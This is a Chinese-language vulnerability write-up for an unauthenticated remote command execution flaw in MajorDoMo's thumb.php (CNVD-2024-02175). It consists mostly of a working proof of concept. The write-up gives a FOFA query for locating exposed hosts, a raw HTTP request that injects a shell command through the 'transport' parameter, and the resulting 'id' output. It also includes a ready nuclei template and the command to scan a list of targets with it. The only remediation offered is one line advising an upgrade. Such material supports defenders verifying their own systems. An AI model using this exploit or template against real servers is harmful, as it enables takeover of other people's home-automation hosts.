**漏洞名称**

MajorDoMo thumb.php 未授权远程代码执行漏洞

**漏洞影响**

MajorDoMo < 0662e5e版本

**漏洞描述**

MajorDoMo是MajorDoMo社区的一个开源DIY智能家居自动化平台。MajorDoMo 0662e5e之前版本/modules/thumb/thumb.php接口处存在未授权远程命令执行漏洞，未经授权的攻击者可以通过该漏洞获取到服务器权限。

**FOFA搜索语句**

```
app="MajordomoSL"
```

**漏洞复现**



POC(来自互联网)，主要是执行id命令并打印



```YAML

GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
```

响应内容如下，其中包含id命令相关内容即可

```YAML
	
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 22 Apr 2024 02:22:10 GMT
Server: nginx/1.14.2

avconv -rtsp_transport || (echo '[S]'; id; echo '[E]')#; -v verbose -timelimit 15 -y -i "rtsp://a
" -r 5 -f image2 -vframes 1 ./cms/cached/thumb_4ea039b31dc743929d475b96816a8529rtspa<hr><pre>[S]
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),33(www-data),44(video),46(plugdev),60(games),100(users),105(input),109(netdev),997(gpio),998(i2c),999(spi)
[E]</pre>
```

漏洞复现完成

**nuclei poc**



poc 内容如下

```YAML
id: CNVD-2024-02175

info:
  name: MajorDoMo thumb.php 未授权远程代码执行漏洞
  author: fgz
  severity: critical
  description: MajorDoMo是MajorDoMo社区的一个开源DIY智能家居自动化平台。MajorDoMo 0662e5e之前版本/modules/thumb/thumb.php接口处存在未授权远程命令执行漏洞，未经授权的攻击者可以通过该漏洞获取到服务器权限。
  metadata:
    max-request: 1
    fofa-query: app="MajordomoSL"
    verified: true
requests:
  - raw:
      - |+
        GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84
        Accept-Charset: utf-8
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'uid') && contains(body, 'gid')"
        condition: and
```

运行POC

```
nuclei.exe -t mypoc/cnvd/CNVD-2024-02175.yaml -l data\2.txt
```

**修复建议**



升级到最新版本。